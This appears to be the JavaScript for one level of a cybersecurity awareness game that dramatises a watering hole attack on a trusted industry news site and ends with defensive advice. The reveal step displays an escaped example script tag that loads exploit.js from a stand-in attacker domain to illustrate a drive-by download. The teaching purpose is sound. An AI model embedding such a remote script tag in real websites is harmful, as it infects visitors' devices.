(() => {
    "use strict";
    const $ = (sel) => document.querySelector(sel);
    const ui = {
        sceneLabel: $("#uiSceneLabel"), panelTitle: $("#uiPanelTitle"), panelMeta: $("#uiPanelMeta"),
        center: $("#uiCenter"), userBubble: $("#uiUserBubble"), phisherBubble: $("#uiPhisherBubble"),
        userText: $("#uiUserText"), phisherText: $("#uiPhisherText"), hint: $("#uiHint"),
        choices: $("#uiChoices"), continueBtn: $("#uiContinueBtn"), homeBtn: $("#uiHomeBtn"), restartBtn: $("#uiRestartBtn"),
    };

    const STORY = {
        scenes: [
            {
                id: "scene1", label: "Scene 1 – Trusted Website", steps: [
                    { speaker: "user", text: "Time to check the industry news portal.\nMy coworkers and I visit this site every day.", center: { view: "trustedSite" } },
                    { speaker: "phisher", text: "Hackers sometimes target trusted websites instead of individuals.\nIf I want to hack a specific company, I find out where its employees hang out online.", center: { view: "trustedSite", spotlight: "url" } },
                ]
            },
            {
                id: "scene2", label: "Scene 2 – Hidden Malware", steps: [
                    { speaker: "user", text: "The site looks completely normal.\nI'm just reading an article...", center: { view: "infectedSite" }, effect: "glitch" },
                    { speaker: "phisher", text: "But the site has been secretly compromised.\nA hidden script in the background is quietly installing malware onto the visitor's device.", center: { view: "infectedSite", reveal: true }, effect: "glitch" },
                    { speaker: "phisher", text: "This is a Watering Hole Attack.\nInstead of hunting the prey, the attacker poisons the watering hole and waits for the victims to drink.", center: { view: "explain" } },
                ]
            },
            {
                id: "scene3", label: "Scene 3 – Consequence", steps: [
                    { speaker: "phisher", text: "Because the victims trust the site, their defenses are down.", center: { view: "consequences" }, effect: "glitch" },
                    { speaker: "phisher", text: "The malware bypasses perimeter security since the connection to the trusted site is allowed, leading to internal network compromise.", center: { view: "consequences", expanded: true }, effect: "glitch" },
                ]
            },
            {
                id: "scene4", label: "Scene 4 – Lesson", steps: [
                    { speaker: "user", text: "How can I defend against an attack on a site I trust?", center: { view: "lesson" }, effect: "safePulse" },
                    { speaker: "user", text: "Keep browsers updated.\nUse endpoint security tools.\nBe cautious and observant, even on trusted websites.", center: { view: "lesson", checklist: true }, effect: "safePulse" },
                    { speaker: "user", text: "Trust but verify. Always maintain good security hygiene, because any website can be compromised.", center: { view: "ending" } },
                ]
            },
        ]
    };

    const state = { sceneId: "scene1", stepIndex: 0, typing: { active: false, target: null, fullText: "", index: 0, timer: null } };

    function getScene(id) { return STORY.scenes.find(s => s.id === id); }
    function getStep() { return getScene(state.sceneId).steps[state.stepIndex]; }
    function nextStep() {
        const scene = getScene(state.sceneId); const next = state.stepIndex + 1;
        if (next < scene.steps.length) { state.stepIndex = next; render(); return; }
        const idx = STORY.scenes.findIndex(s => s.id === state.sceneId);
        const ns = STORY.scenes[idx + 1];
        if (ns) { state.sceneId = ns.id; state.stepIndex = 0; render(); }
    }

    function clearTyping() { if (state.typing.timer != null) clearTimeout(state.typing.timer); Object.assign(state.typing, { active: false, target: null, fullText: "", index: 0, timer: null }); }
    function finishTyping() { if (!state.typing.active || !state.typing.target) return; state.typing.target.textContent = state.typing.fullText; const c = document.createElement("span"); c.className = "typeCursor"; state.typing.target.appendChild(c); clearTyping(); updateContinue(); }
    function typeInto(target, text) {
        clearTyping(); Object.assign(state.typing, { active: true, target, fullText: text, index: 0 }); target.textContent = "";
        const tick = () => { if (!state.typing.active) return; const t = state.typing.target, i = state.typing.index; if (i >= state.typing.fullText.length) { finishTyping(); return; } t.textContent += state.typing.fullText.charAt(i); state.typing.index++; const c = document.createElement("span"); c.className = "typeCursor"; t.appendChild(c); state.typing.timer = setTimeout(tick, 14 + Math.floor(Math.random() * 12)); };
        state.typing.timer = setTimeout(tick, 40);
    }

    function renderTrustedSite(c) {
        const style = c.spotlight === "url" ? 'border:2px solid rgba(40,255,152,0.8);box-shadow:0 0 15px rgba(40,255,152,0.3);' : '';
        ui.center.innerHTML = `<div class="card"><div class="browserBar"><div class="dotRow"><span class="dot dot--r"></span><span class="dot dot--y"></span><span class="dot dot--g"></span></div><div class="address" style="${style}">https://www.industry-news-daily.com</div></div><div class="dashboard" style="text-align:center;"><div style="font-size:42px;margin:20px 0;">📰</div><div class="balance">Industry News Portal</div><div class="balanceSub">A trusted daily read for professionals.</div></div></div>`;
        ui.hint.textContent = c.spotlight === "url" ? "The site is legitimate, making it the perfect trap." : "A familiar, trusted website.";
    }

    function renderInfectedSite(c) {
        const extra = c.reveal ? '<div class="callout callout--danger" style="margin-top:15px;font-family:monospace;font-size:11px;">&lt;script src="http://malicious-domain.com/exploit.js"&gt;&lt;/script&gt;<br>// Silently executing drive-by download...</div>' : '';
        ui.center.innerHTML = `<div class="card"><div class="browserBar"><div class="dotRow"><span class="dot dot--r"></span><span class="dot dot--y"></span><span class="dot dot--g"></span></div><div class="address">https://www.industry-news-daily.com</div></div><div class="dashboard" style="text-align:center;"><div style="font-size:42px;margin:20px 0;">📰</div><div class="balance">Industry News Portal</div><div class="balanceSub">Reading article...</div>${extra}</div></div>`;
        ui.hint.textContent = c.reveal ? "The infection happens invisibly in the background." : "Everything looks normal on the surface.";
    }

    function renderExplain() {
        ui.center.innerHTML = `<div class="card"><div class="card__hdr"><span class="pill">📖 What is a Watering Hole Attack?</span></div><div class="lesson"><div class="callout callout--danger">In a <strong>Watering Hole Attack</strong>, the attacker observes which websites a targeted group often visits and infects one or more of them with malware.</div><div class="callout"><strong>The Strategy:</strong><br>• Identify sites trusted by the target (e.g., industry forums, local news)<br>• Exploit a vulnerability to compromise the site<br>• Wait for the targets to visit and become infected via drive-by downloads</div></div></div>`;
        ui.hint.textContent = "It relies on exploiting the trust users have in familiar websites.";
    }

    function renderConsequences(c) {
        const items = [["💻", "Device infection", "Malware installed without user interaction"], ["🏢", "Corporate network compromise", "Attacker gains a foothold inside the company network"], ["📂", "Data theft", "Sensitive corporate information exfiltrated"]];
        ui.center.innerHTML = `<div class="card"><div class="card__hdr"><span class="pill" style="border-color:rgba(255,45,85,0.4);color:rgba(255,45,85,0.95);">💀 Consequences</span></div><div class="dashboard"><div class="activity">${items.map(i => `<div class="activityRow"><div class="activityRow__left"><div class="activityRow__title">${i[0]} ${i[1]}</div><div class="activityRow__meta">${i[2]}</div></div><div class="delta delta--out">RISK</div></div>`).join("")}</div>${c?.expanded ? '<div class="callout callout--danger" style="margin-top:10px;"><strong>The attacker achieves internal access bypassing outer defenses.</strong></div>' : ''}</div></div>`;
    }

    function renderLesson(c) {
        ui.center.innerHTML = `<div class="card"><div class="card__hdr"><span class="pill">🛡 Defenses</span></div><div class="lesson"><div class="callout callout--good"><strong>Watering hole defense:</strong> Assume any website could be compromised.</div>${c?.checklist ? '<div class="card" style="border-color:rgba(217,255,233,0.12);"><div class="card__hdr"><span class="pill">Defensive actions</span></div><div class="lesson" style="padding-top:10px;"><ul class="list"><li>Keep browsers and plugins strictly up-to-date to patch exploits</li><li>Use robust endpoint security and anti-malware tools</li><li>Employ network monitoring to detect anomalous outbound traffic</li></ul></div></div>' : ''}</div></div>`;
    }

    function renderEnding() {
        try { const l = JSON.parse(localStorage.getItem("cyberLevels") || "{}"); l.level6 = true; localStorage.setItem("cyberLevels", JSON.stringify(l)); } catch (e) { }
        try { localStorage.setItem("wateringhole_complete", "true"); } catch (e) { }
        levelComplete();
        ui.center.innerHTML = `<div class="card"><div class="card__hdr"><span class="pill">✅ Level 6 Complete</span></div><div class="lesson"><div class="callout callout--good"><strong>Final message:</strong><br>Keep browsers updated.<br>Use security tools.<br>Be cautious even on trusted websites.</div><div class="callout">Return to the menu to continue.</div></div></div>`;
        ui.hint.textContent = "✔ Level 6 Complete — Watering Hole Attack.";
    }

    function renderCenter(step) {
        const c = step.center || {};
        if (c.view === "trustedSite") return renderTrustedSite(c);
        if (c.view === "infectedSite") return renderInfectedSite(c);
        if (c.view === "explain") return renderExplain();
        if (c.view === "consequences") return renderConsequences(c);
        if (c.view === "lesson") return renderLesson(c);
        if (c.view === "ending") return renderEnding();
    }

    function setEffect(effect) {
        const a = $("#app"); a.classList.remove("is-compromised", "is-safePulse");
        if (effect === "glitch") a.classList.add("is-compromised");
        if (effect === "safePulse") { a.classList.add("is-safePulse"); setTimeout(() => a.classList.remove("is-safePulse"), 950); }
    }

    function renderBubbles(step) {
        const isU = step.speaker === "user";
        ui.userBubble.style.opacity = isU ? "1" : "0.5"; ui.phisherBubble.style.opacity = isU ? "0.5" : "1";
        ui.userText.textContent = ""; ui.phisherText.textContent = "";
        typeInto(isU ? ui.userText : ui.phisherText, step.text);
    }

    function updateContinue() {
        ui.continueBtn.disabled = false;
        ui.continueBtn.textContent = state.typing.active ? "Skip" : "Continue";
    }

    function render() {
        const step = getStep(), scene = getScene(state.sceneId);
        ui.sceneLabel.textContent = scene.label; ui.panelTitle.textContent = scene.label.toUpperCase();
        ui.panelMeta.textContent = `Step ${state.stepIndex + 1}/${scene.steps.length}`;
        if (step.effect === "glitch") setEffect("glitch"); else if (step.effect === "safePulse") setEffect("safePulse"); else setEffect("none");
        renderCenter(step); renderBubbles(step); updateContinue();
    }

    function levelComplete() {
        if (ui.continueBtn) ui.continueBtn.style.display = "none";
        if (ui.homeBtn) ui.homeBtn.style.display = "inline-block";
    }

    ui.continueBtn.addEventListener("click", () => { if (state.typing.active) { finishTyping(); return; } nextStep(); });
    ui.restartBtn.addEventListener("click", () => { clearTyping(); state.sceneId = "scene1"; state.stepIndex = 0; render(); });
    if (ui.homeBtn) ui.homeBtn.addEventListener("click", () => { window.location.href = "index.html"; });
    window.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); ui.continueBtn.click(); } });

    function enableImageFallback(a, b) { const i = document.querySelector(a), f = document.querySelector(b); if (!i || !f) return; i.addEventListener("error", () => { i.style.display = "none"; f.style.display = "block"; }); }
    enableImageFallback(".char--user .char__img", ".char__imgFallback--user");
    enableImageFallback(".char--phisher .char__img", ".char__imgFallback--phisher");
    render();
})();
